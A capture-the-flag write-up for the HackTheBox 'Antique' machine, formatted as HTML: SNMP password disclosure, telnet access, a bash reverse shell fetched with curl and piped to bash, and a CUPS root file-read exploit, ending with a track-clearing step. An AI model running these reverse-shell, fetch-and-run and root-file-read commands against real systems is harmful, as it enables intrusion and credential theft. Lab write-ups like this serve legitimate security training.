@@ -1,0 +1,920 @@
+
+  
+    
+    <title>
+      HackTheBox - Antique (Easy)
+    </title>
+    
+  
+  
+    
+      <header>
+<div class="header"><img src="https://www.notion.so/images/page-cover/gradients_5.png" class="headerImage"/>
+<img class="headerIcon" src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Antique/icon.png"/>
+<h1 class="mainTitle">
+          HackTheBox - Antique (Easy)
+        </h1 class="mainTitle">
+</div></header>
+      <div class="writeUp">
+        <h1 id="77739a1d-cc06-45f3-8478-ee4065a938bc">
+          Table of contents
+        </h1>
+        <nav id="d763e867-ca94-47d1-a67c-3bdc8313f37d">
+          <div>
+            <a href="#77739a1d-cc06-45f3-8478-ee4065a938bc">
+              Table of contents
+            </a>
+          </div>
+          <div>
+            <a href="#778dcca9-7785-49af-b2ae-cf754955ba13">
+              Enumeration
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#b91570fc-23a7-446f-ab44-985cce0b3a88">
+              
+                Nmap scan
+              
+            </a>
+          </div>
+          <div>
+            <a class="t3" href="#f56bc529-6a9d-4abc-a52d-2a7380bded37">
+              
+                TCP
+              
+            </a>
+          </div>
+          <div>
+            <a class="t3" href="#5dc73825-3502-418c-a183-2d8a02558149">
+              
+                UDP
+              
+            </a>
+          </div>
+          <div>
+            <a href="#41fd576d-259a-4e33-92f5-a33aad2f4fe3">
+              Initial access
+            </a>
+          </div>
+          <div>
+            <a href="#1caf5585-3704-4ddd-8b16-29dbdaab90eb">
+              
+                
+                  SNMP JetAdmin Device Password Disclosure
+                
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#2f4b4315-6ad8-4b91-87cd-13c85458780c">
+              
+                Getting a shell
+              
+            </a>
+          </div>
+          <div>
+            <a href="#fe5ed587-c7e3-4d1a-9ba2-1a33f729ca34">
+              Post-exploitation
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#5eab7abe-bf0a-4f67-9422-d8b9a47b4525">
+              
+                Local enumeration
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#eca3ac21-6e69-4ee9-a225-53099d6d80b4">
+              
+                Privilege escalation
+              
+            </a>
+          </div>
+          <div>
+            <a href="#c36dfd75-6a7a-4be3-8aa6-f7771e3010c0">
+              Clearing tracks
+            </a>
+          </div>
+          <div>
+            <a href="#0b7a658d-c51f-4499-a364-0ae5ce0f2668">
+              Vulnerabilities summary
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#d68b5f54-697d-45dc-ac80-f663d5c55708">
+              
+                Information disclosure (CVE-2002-1048)
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#e23853d6-eaab-4317-9819-2ffc7fba9096">
+              
+                Root file read (CVE-2012-5519)
+              
+            </a>
+          </div>
+          <div>
+            <a href="#40b17c9d-cd64-4d38-b76c-496fb730ec78">
+              Tools used
+            </a>
+          </div>
+          <div>
+            <a href="#5b56d0c5-b40f-49a0-a0d4-f782d443c541">
+              Sources
+            </a>
+          </div>
+        </nav>
+        <h1 id="778dcca9-7785-49af-b2ae-cf754955ba13">
+          Enumeration
+        </h1>
+        <h2 id="b91570fc-23a7-446f-ab44-985cce0b3a88">
+          
+            Nmap scan
+          
+        </h2>
+        <h3 id="f56bc529-6a9d-4abc-a52d-2a7380bded37">
+          
+            TCP
+          
+        </h3>
+        
+        
+        
+<pre id="e3f406eb-af8c-470f-bd1b-c9d38cd1027e" class="code"><code># Nmap 7.93 scan initiated Tue Feb 20 16:49:57 2024 as: nmap -A -T5 -v -p- -oN nmapResults.txt 10.129.250.235
+Warning: 10.129.250.235 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.129.250.235
+Host is up (0.029s latency).
+Not shown: 65529 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE VERSION
+23/tcp    open     telnet?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
+|     JetDirect
+|     Password:
+|   NULL: 
+|_    JetDirect
+20120/tcp filtered unknown
+38065/tcp filtered unknown
+40915/tcp filtered unknown
+45222/tcp filtered unknown
+64470/tcp filtered unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port23-TCP:V=7.93%I=7%D=2/20%Time=65D4CA3E%P=x86_64-pc-linux-gnu%r(NULL
+SF:,F,&quot;\nHP\x20JetDirect\n\n&quot;)%r(GenericLines,19,&quot;\nHP\x20JetDirect\n\nPas
+SF:sword:\x20&quot;)%r(tn3270,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r(GetReq
+SF:uest,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r(HTTPOptions,19,&quot;\nHP\x2
+SF:0JetDirect\n\nPassword:\x20&quot;)%r(RTSPRequest,19,&quot;\nHP\x20JetDirect\n\nPa
+SF:ssword:\x20&quot;)%r(RPCCheck,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r(DNS
+SF:VersionBindReqTCP,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r(DNSStatusR
+SF:equestTCP,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r(Help,19,&quot;\nHP\x20J
+SF:etDirect\n\nPassword:\x20&quot;)%r(SSLSessionReq,19,&quot;\nHP\x20JetDirect\n\nPa
+SF:ssword:\x20&quot;)%r(TerminalServerCookie,19,&quot;\nHP\x20JetDirect\n\nPassword:
+SF:\x20&quot;)%r(TLSSessionReq,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r(Kerbe
+SF:ros,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r(SMBProgNeg,19,&quot;\nHP\x20J
+SF:etDirect\n\nPassword:\x20&quot;)%r(X11Probe,19,&quot;\nHP\x20JetDirect\n\nPasswor
+SF:d:\x20&quot;)%r(FourOhFourRequest,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r
+SF:(LPDString,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r(LDAPSearchReq,19,
+SF:&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r(LDAPBindReq,19,&quot;\nHP\x20JetDire
+SF:ct\n\nPassword:\x20&quot;)%r(SIPOptions,19,&quot;\nHP\x20JetDirect\n\nPassword:\x
+SF:20&quot;)%r(LANDesk-RC,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r(TerminalSe
+SF:rver,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r(NCP,19,&quot;\nHP\x20JetDire
+SF:ct\n\nPassword:\x20&quot;)%r(NotesRPC,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20
+SF:&quot;)%r(JavaRMI,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r(WMSRequest,19,&quot;
+SF:\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r(oracle-tns,19,&quot;\nHP\x20JetDirect
+SF:\n\nPassword:\x20&quot;)%r(ms-sql-s,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)
+SF:%r(afp,19,&quot;\nHP\x20JetDirect\n\nPassword:\x20&quot;)%r(giop,19,&quot;\nHP\x20JetD
+SF:irect\n\nPassword:\x20&quot;);
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Feb 20 16:53:00 2024 -- 1 IP address (1 host up) scanned in 183.37 seconds</code></pre>
+        <p id="f37e37a0-5aee-4c96-b4ba-7ae2cc92805d">
+          It seems that there is a telnet service running on port 23. By reading the returned data, we can see it has something to do with HP JetDirect. 
+        </p>
+        <blockquote id="2ba2d95a-1be4-493a-8b6b-4b01d9ed5463">
+          
+            HP Jetdirect
+          
+           is the name of a technology sold by 
+          <a href="https://en.wikipedia.org/wiki/Hewlett-Packard">
+            Hewlett-Packard
+          </a>
+           that allows 
+          <a href="https://en.wikipedia.org/wiki/Computer_printers">
+            computer printers
+          </a>
+           to be directly attached to a 
+          <a href="https://en.wikipedia.org/wiki/Local_area_network">
+            local area network
+          </a>
+          . The &quot;Jetdirect&quot; designation covers a range of models from the external 1 and 3 port parallel print servers known as the 300x and 500x, to the internal EIO print servers for use with HP printers.
+        </blockquote>
+        <p id="a1d428d6-12bd-41f2-833c-f22712d297b2">
+          Some HP JetDirect Printers are vulnerable to 
+          
+            CVE-2002-1048 which allows an attacker to retrieve the HP JetAdmin passowrd from the SNMP service. Let’s run a UDP nmap scan against the target to see if it has the SNMP service accessible :
+          
+        </p>
+        <h3 id="5dc73825-3502-418c-a183-2d8a02558149">
+          
+            UDP
+          
+        </h3>
+        
+        
+        
+<pre id="56931690-cfa1-4aea-b3ea-b9340c26ff04" class="code"><code>Nmap scan report for 10.129.250.235
+Host is up (0.11s latency).
+Not shown: 998 closed udp ports (port-unreach)
+PORT    STATE         SERVICE
+68/udp  open|filtered dhcpc
+161/udp open          snmp
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1017.35 seconds</code></pre>
+        <p id="46eb5350-750d-4542-a8c6-165046627e0c">
+          It has the SNMP service accessible, so we might be able to exploit 
+          
+            CVE-2002-1048.
+          
+        </p>
+        <h1 id="41fd576d-259a-4e33-92f5-a33aad2f4fe3">
+          Initial access
+        </h1>
+        <h2 id="1caf5585-3704-4ddd-8b16-29dbdaab90eb">
+          
+            
+              SNMP JetAdmin Device Password Disclosure
+            
+          
+        </h2>
+        <p id="abb662a7-d1ee-4d4a-947e-7362b1c2d6ba">
+          To exploit 
+          
+            CVE-2002-1048, we can use snmpget like so :
+          
+        </p>
+        
+        
+        
+<pre id="e69f46a5-f31b-4fff-a3db-2f8235b588ae" class="code"><code>┌──(cyberretta㉿kali-laptop)-[~/SNMPUtil]
+└─$ snmpget -v 2c 10.129.250.235 -c public .1.3.6.1.4.1.11.2.3.9.1.1.13.0
+iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
+33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135</code></pre>
+        <p id="c8e2c280-feec-4178-a7de-517b32a8e9a2">
+          We receive a response in hexadecimal. We can convert it to ASCII characters using CyberChef :
+        </p>
+        
+          <a href="HackTheBox%20-%20Antique%20(Easy)%201862e62d2197468fb0128ec24baf25e8/Untitled.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Antique/Untitled.png"/>
+          </a>
+        
+        <p id="3aa7ae64-7440-4224-82b1-aa126bd320fb">
+          As we can see, it contains the HP JetAdmin password.
+        </p>
+        <h2 id="2f4b4315-6ad8-4b91-87cd-13c85458780c">
+          
+            Getting a shell
+          
+        </h2>
+        <p id="3f8d953c-012b-4b41-a637-aa19211b5298">
+          When we connect to the telnet service on port 23, it asks for a password :
+        </p>
+        
+        
+        
+<pre id="3c04dd28-3396-41ec-9b8e-fc756111a4e2" class="code"><code>┌──(cyberretta㉿kali-laptop)-[~/SNMPUtil]
+└─$ nc 10.129.250.235 23
+
+HP JetDirect
+
+
+Password:</code></pre>
+        <p id="95ded1da-09a2-423a-8cce-8200add0d373">
+          We can try to use the password we found earlier :
+        </p>
+        
+        
+        
+<pre id="9c2d33b4-54ed-406a-afed-33a4668d8d92" class="code"><code>┌──(cyberretta㉿kali-laptop)-[~/SNMPUtil]
+└─$ nc 10.129.250.235 23
+
+HP JetDirect
+
+
+Password: P@ssw0rd@123!!123
+
+Please type &quot;?&quot; for HELP
+&gt;</code></pre>
+        <p id="11c005b3-c105-4171-af40-7e96d12014c0">
+          It works ! Let’s see what we can do on this service by showing the help menu :
+        </p>
+        
+        
+        
+<pre id="eb0491f5-b680-4ecd-b0d5-ea2d81e07d22" class="code"><code>&gt; ?
+
+To Change/Configure Parameters Enter:
+Parameter-name: value &lt;Carriage Return&gt;
+
+Parameter-name Type of value
+ip: IP-address in dotted notation
+subnet-mask: address in dotted notation (enter 0 for default)
+default-gw: address in dotted notation (enter 0 for default)
+syslog-svr: address in dotted notation (enter 0 for default)
+idle-timeout: seconds in integers
+set-cmnty-name: alpha-numeric string (32 chars max)
+host-name: alpha-numeric string (upper case only, 32 chars max)
+dhcp-config: 0 to disable, 1 to enable
+allow: &lt;ip&gt; [mask] (0 to clear, list to display, 10 max)
+
+addrawport: &lt;TCP port num&gt; (&lt;TCP port num&gt; 3000-9000)
+deleterawport: &lt;TCP port num&gt;
+listrawport: (No parameter required)
+
+exec: execute system commands (exec id)
+exit: quit from telnet session</code></pre>
+        <p id="4ba658a4-00e8-439f-8fa7-e09781b59e5c">
+          By using the exec command, we can execute system commands. We wan use this to execute a reverse shell. First, we need to create a bash script containing our payload :
+        </p>
+        
+        
+        
+<pre id="9c2f4c60-a51f-48a6-9264-8f006e8e25a9" class="code"><code>┌──(cyberretta㉿kali-laptop)-[~]
+└─$ cat rshell.sh 
+#!/bin/bash
+
+/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.86/4444 0&gt;&amp;1</code></pre>
+        <p id="ac4626ca-9102-4b23-a7cc-1095acb40a40">
+          Then, we can start a web server using python :
+        </p>
+        
+        
+        
+<pre id="c674e821-c684-4302-9b87-12039454b51f" class="code"><code>┌──(cyberretta㉿kali-laptop)-[~]
+└─$ python3 -m http.server 80            
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre>
+        <p id="4f0552ff-0dd4-4805-ba9b-8b7ba18a9119">
+          Next, we can start a listener :
+        </p>
+        
+        
+        
+<pre id="499cf548-d690-4eeb-a332-0ff778562f94" class="code"><code>┌──(cyberretta㉿kali-laptop)-[~]
+└─$ pwncat-cs -lp 4444
+/home/cyberretta/.local/lib/python3.11/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
+  &#x27;class&#x27;: algorithms.Blowfish,
+[00:44:05] Welcome to pwncat 🐈!                                                                                                              __main__.py:164
+bound to 0.0.0.0:4444 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code></pre>
+        <p id="407c029b-adca-495a-974f-6448d2acfba5">
+          Finally, we can execute our payload on the target system :
+        </p>
+        
+        
+        
+<pre id="90d7793d-3d5d-42e6-96ae-5e0e630f9f39" class="code"><code>&gt; exec curl 10.10.14.86/rshell.sh|bash</code></pre>
+        <p id="004bf57e-b1e2-454c-a0ad-bc0d9c9b6947">
+          If we take a look at our listener, we should have received a connection :
+        </p>
+        
+        
+        
+<pre id="5316c991-9a33-4539-b442-fa937c3ad14c" class="code"><code>┌──(cyberretta㉿kali-laptop)-[~]
+└─$ pwncat-cs -lp 4444
+/home/cyberretta/.local/lib/python3.11/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
+  &#x27;class&#x27;: algorithms.Blowfish,
+[01:06:12] Welcome to pwncat 🐈!                                                                                                              __main__.py:164
+[01:08:26] received connection from 10.129.250.235:59570                                                                                           bind.py:84
+[01:08:28] 10.129.250.235:59570: registered new host w/ db                                                                                     manager.py:957
+(local) pwncat$                                                                                                                                              
+(remote) lp@antique:/var/spool/lpd$ id
+uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)</code></pre>
+        <p id="cc91b23d-595a-4f83-97fd-74a735c6f6b7">
+          We have now a foothold on the target system as lp.
+        </p>
+        <h1 id="fe5ed587-c7e3-4d1a-9ba2-1a33f729ca34">
+          Post-exploitation
+        </h1>
+        <h2 id="5eab7abe-bf0a-4f67-9422-d8b9a47b4525">
+          
+            Local enumeration
+          
+        </h2>
+        <p id="97291021-a6d8-4e0b-a771-e80e5e0950bf">
+          If we take a look at the listening port we can see that there is a service accessible only locally which we didn’t saw in the Nmap scan :
+        </p>
+        
+        
+        
+<pre id="2e7e7718-a551-4ef2-a9fc-235dc594d833" class="code"><code>(remote) lp@antique:/tmp$ netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1157/python3        
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:161             0.0.0.0:*                           -</code></pre>
+        <p id="fe8c93b9-fabf-4d47-a08a-8313f2ad81e8">
+          We can use curl to see what response we get when sending a request to the service on port 631 :
+        </p>
+        
+        
+        
+<pre id="31e9f1fe-8b90-4474-b41c-ca38487647f7" class="code"><code>(remote) lp@antique:/tmp$ curl localhost:631
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
+&lt;HTML&gt;
+&lt;HEAD&gt;
+        &lt;META HTTP-EQUIV=&quot;Content-Type&quot; CONTENT=&quot;text/html; charset=utf-8&quot;&gt;
+        &lt;TITLE&gt;Home - CUPS 1.6.1&lt;/TITLE&gt;
+        &lt;LINK REL=&quot;STYLESHEET&quot; TYPE=&quot;text/css&quot; HREF=&quot;/cups.css&quot;&gt;
+        &lt;LINK REL=&quot;SHORTCUT ICON&quot; HREF=&quot;/images/cups-icon.png&quot; TYPE=&quot;image/png&quot;&gt;
+&lt;/HEAD&gt;
+&lt;BODY&gt;
+&lt;TABLE CLASS=&quot;page&quot; SUMMARY=&quot;{title}&quot;&gt;
+&lt;TR&gt;&lt;TD CLASS=&quot;body&quot;&gt;
+&lt;TABLE BORDER=&quot;0&quot; CELLPADDING=&quot;0&quot; CELLSPACING=&quot;0&quot; SUMMARY=&quot;&quot;&gt;
+&lt;TR HEIGHT=&quot;36&quot;&gt;
+&lt;TD&gt;&lt;A HREF=&quot;http://www.cups.org/&quot; TARGET=&quot;_blank&quot;&gt;&lt;IMG
+SRC=&quot;/images/left.gif&quot; WIDTH=&quot;64&quot; HEIGHT=&quot;36&quot; BORDER=&quot;0&quot; ALT=&quot;&quot;&gt;&lt;/A&gt;&lt;/TD&gt;
+&lt;TD CLASS=&quot;sel&quot;&gt;&lt;A HREF=&quot;/&quot;&gt;&amp;nbsp;&amp;nbsp;Home&amp;nbsp;&amp;nbsp;&lt;/A&gt;&lt;/TD&gt;
+&lt;TD CLASS=&quot;unsel&quot;&gt;&lt;A HREF=&quot;/admin&quot;&gt;&amp;nbsp;&amp;nbsp;Administration&amp;nbsp;&amp;nbsp;&lt;/A&gt;&lt;/TD&gt;
+&lt;TD CLASS=&quot;unsel&quot;&gt;&lt;A HREF=&quot;/classes/&quot;&gt;&amp;nbsp;&amp;nbsp;Classes&amp;nbsp;&amp;nbsp;&lt;/A&gt;&lt;/TD&gt;
+&lt;TD CLASS=&quot;unsel&quot;&gt;&lt;A HREF=&quot;/help/&quot;&gt;&amp;nbsp;&amp;nbsp;Online&amp;nbsp;Help&amp;nbsp;&amp;nbsp;&lt;/A&gt;&lt;/TD&gt;
+&lt;TD CLASS=&quot;unsel&quot;&gt;&lt;A HREF=&quot;/jobs/&quot;&gt;&amp;nbsp;&amp;nbsp;Jobs&amp;nbsp;&amp;nbsp;&lt;/A&gt;&lt;/TD&gt;
+&lt;TD CLASS=&quot;unsel&quot;&gt;&lt;A HREF=&quot;/printers/&quot;&gt;&amp;nbsp;&amp;nbsp;Printers&amp;nbsp;&amp;nbsp;&lt;/A&gt;&lt;/TD&gt;
+&lt;TD CLASS=&quot;unsel&quot; WIDTH=&quot;100%&quot;&gt;&lt;FORM ACTION=&quot;/help/&quot; METHOD=&quot;GET&quot;&gt;&lt;INPUT
+TYPE=&quot;SEARCH&quot; NAME=&quot;QUERY&quot; SIZE=&quot;20&quot; PLACEHOLDER=&quot;Search Help&quot;
+AUTOSAVE=&quot;org.cups.help&quot; RESULTS=&quot;20&quot;&gt;&lt;/FORM&gt;&lt;/TD&gt;
+&lt;TD&gt;&lt;IMG SRC=&quot;/images/right.gif&quot; WIDTH=&quot;4&quot; HEIGHT=&quot;36&quot; ALT=&quot;&quot;&gt;&lt;/TD&gt;
+&lt;/TR&gt;
+&lt;/TABLE&gt;
+
+&lt;TABLE CLASS=&quot;indent&quot; SUMMARY=&quot;&quot;&gt;
+&lt;TR&gt;&lt;TD STYLE=&quot;padding-right: 20px;&quot;&gt;
+
+&lt;H1&gt;CUPS 1.6.1&lt;/H1&gt;
+
+&lt;P&gt;CUPS is the standards-based, open source printing system developed by
+&lt;A HREF=&quot;http://www.apple.com/&quot;&gt;Apple Inc.&lt;/A&gt; for OS&lt;SUP&gt;&amp;reg;&lt;/SUP&gt; X and
+other UNIX&lt;SUP&gt;&amp;reg;&lt;/SUP&gt;-like operating systems.&lt;/P&gt;
+
+&lt;/TD&gt;
+&lt;TD&gt;&lt;A HREF=&quot;http://www.cups.org/&quot;&gt;&lt;IMG SRC=&quot;images/cups-icon.png&quot; WIDTH=&quot;128&quot;
+HEIGHT=&quot;128&quot; ALT=&quot;CUPS&quot;&gt;&lt;/A&gt;&lt;/TD&gt;
+&lt;/TR&gt;
+&lt;/TABLE&gt;
+
+&lt;TABLE CLASS=&quot;indent&quot; SUMMARY=&quot;&quot;&gt;
+&lt;TR&gt;&lt;TD VALIGN=&quot;top&quot; STYLE=&quot;border-right: dotted thin #cccccc; padding-right: 20px;&quot;&gt;
+
+&lt;H2&gt;CUPS for Users&lt;/H2&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/overview.html&quot;&gt;Overview of CUPS&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/options.html&quot;&gt;Command-Line Printing and Options&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/whatsnew.html&quot;&gt;What&#x27;s New in CUPS 1.6&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;http://www.cups.org/newsgroups.php?gcups.general&quot;&gt;User Forum&lt;/A&gt;&lt;/P&gt;
+
+&lt;/TD&gt;&lt;TD VALIGN=&quot;top&quot; STYLE=&quot;border-right: dotted thin #cccccc; padding-left: 20px; padding-right: 20px;&quot;&gt;
+
+&lt;H2&gt;CUPS for Administrators&lt;/H2&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;admin&quot;&gt;Adding Printers and Classes&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/policies.html&quot;&gt;Managing Operation Policies&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/accounting.html&quot;&gt;Printer Accounting Basics&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/security.html&quot;&gt;Server Security&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/kerberos.html&quot;&gt;Using Kerberos Authentication&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/network.html&quot;&gt;Using Network Printers&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/ref-cupsd-conf.html&quot;&gt;cupsd.conf Reference&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;http://www.cups.org/ppd.php&quot;&gt;Find Printer Drivers&lt;/A&gt;&lt;/P&gt;
+
+&lt;/TD&gt;&lt;TD VALIGN=&quot;top&quot; STYLE=&quot;padding-left: 20px;&quot;&gt;
+
+&lt;H2&gt;CUPS for Developers&lt;/H2&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/api-overview.html&quot;&gt;Introduction to CUPS Programming&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/api-cups.html&quot;&gt;CUPS API&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/api-filter.html&quot;&gt;Filter and Backend Programming&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/api-httpipp.html&quot;&gt;HTTP and IPP APIs&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/api-ppd.html&quot;&gt;PPD API&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/api-raster.html&quot;&gt;Raster API&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;help/ref-ppdcfile.html&quot;&gt;PPD Compiler Driver Information File Reference&lt;/A&gt;&lt;/P&gt;
+
+&lt;P&gt;&lt;A HREF=&quot;http://www.cups.org/newsgroups.php?gcups.development&quot;&gt;Developer Forum&lt;/A&gt;&lt;/P&gt;
+
+&lt;/TD&gt;&lt;/TR&gt;
+&lt;/TABLE&gt;
+
+&lt;/TD&gt;&lt;/TR&gt;
+&lt;TR&gt;&lt;TD&gt;&amp;nbsp;&lt;/TD&gt;&lt;/TR&gt;
+&lt;TR&gt;&lt;TD CLASS=&quot;trailer&quot;&gt;CUPS and the CUPS logo are trademarks of
+&lt;A HREF=&quot;http://www.apple.com&quot;&gt;Apple Inc.&lt;/A&gt; CUPS is copyright 2007-2012 Apple
+Inc. All rights reserved.&lt;/TD&gt;&lt;/TR&gt;
+&lt;/TABLE&gt;
+&lt;/BODY&gt;
+&lt;/HTML&gt;</code></pre>
+        <p id="073a756e-9fb2-43ea-b510-0feebaf6969b">
+          CUPS 1.6.1 is vulnerable to CVE-2012-5519 which allows an attacker to read files as root. We can use this to read the root flag.
+        </p>
+        <h2 id="eca3ac21-6e69-4ee9-a225-53099d6d80b4">
+          
+            Privilege escalation
+          
+        </h2>
+        <p id="e2e5443b-11a1-4a41-ae96-a8a191a3cccc">
+          There is an exploit available 
+          <a href="https://github.com/p1ckzi/CVE-2012-5519/blob/main/cups-root-file-read.sh">
+            here
+          </a>
+           to exploit 
+          
+            CVE-2012-5519 :
+          
+        </p>
+        
+        
+        
+<pre id="8cd57ec1-e721-4324-a584-86242b5fcde5" class="code"><code>(remote) lp@antique:/tmp$ chmod +x exploit.sh 
+(remote) lp@antique:/tmp$ ./exploit.sh 
+                                            _
+  ___ _   _ _ __  ___       _ __ ___   ___ | |_
+ / __| | | | &#x27;_ \/ __|_____| &#x27;__/ _ \ / _ \| __|____
+| (__| |_| | |_) \__ \_____| | | (_) | (_) | ||_____|
+ \___|\__,_| .__/|___/     |_|  \___/ \___/ \__|
+ / _(_) | _|_|      _ __ ___  __ _  __| |  ___| |__
+| |_| | |/ _ \_____| &#x27;__/ _ \/ _` |/ _` | / __| &#x27;_ \ 
+|  _| | |  __/_____| | |  __/ (_| | (_| |_\__ \ | | |
+|_| |_|_|\___|     |_|  \___|\__,_|\__,_(_)___/_| |_|
+a bash implementation of CVE-2012-5519 for linux.
+
+[i] performing checks...
+[i] checking for cupsctl command...
+[+] cupsctl binary found in path.
+[i] checking cups version...
+[+] using cups 1.6.1. version may be vulnerable.
+[i] checking user lp in lpadmin group...
+[+] user part of lpadmin group.
+[i] checking for curl command...
+[+] curl binary found in path.
+[+] all checks passed.
+
+[!] warning!: this script will set the group ownership of
+[!] viewed files to user &#x27;lp&#x27;.
+[!] files will be created as root and with group ownership of
+[!] user &#x27;lp&#x27; if a nonexistant file is submitted.
+[!] changes will be made to /etc/cups/cups.conf file as part of the
+[!] exploit. it may be wise to backup this file or copy its contents
+[!] before running the script any further if this is a production
+[!] environment and/or seek permissions beforehand.
+[!] the nature of this exploit is messy even if you know what you&#x27;re looking for.
+
+[i] usage:
+        input must be an absolute path to an existing file.
+        eg.
+        1. /root/.ssh/id_rsa
+        2. /root/.bash_history
+        3. /etc/shadow
+        4. /etc/sudoers ... etc.
+[i] ./exploit.sh commands:
+        type &#x27;info&#x27; for exploit details.
+        type &#x27;help&#x27; for this dialog text.
+        type &#x27;quit&#x27; to exit the script.
+[i] for more information on the limitations
+[i] of the script and exploit, please visit:
+[i] https://github.com/0zvxr/CVE-2012-5519/blob/main/README.md
+[&gt;] /root/root.txt                                                                                                                                           
+[+] contents of /root/root.txt:
+[FLAG]</code></pre>
+        <h1 id="c36dfd75-6a7a-4be3-8aa6-f7771e3010c0">
+          Clearing tracks
+        </h1>
+        <table id="bae53c3e-bec9-4be4-bf07-4dd2aa7bc1d6">
+          <thead>
+            <tr id="3a32eb41-5ee1-4eeb-acf1-b0d2ee72f8ac">
+              <th id="xDBb">
+                Step
+              </th>
+              <th id="^z&gt;Y">
+                Tracks to remove
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="d26f8c1f-a2b3-4195-87ad-18f6f7bd7f79">
+              <td id="xDBb">
+                Post-exploitation - Privilege escalation
+              </td>
+              <td id="^z&gt;Y">
+                - Remove exploit.sh from /tmp
+              </td>
+            </tr>
+          </tbody>
+        </table>
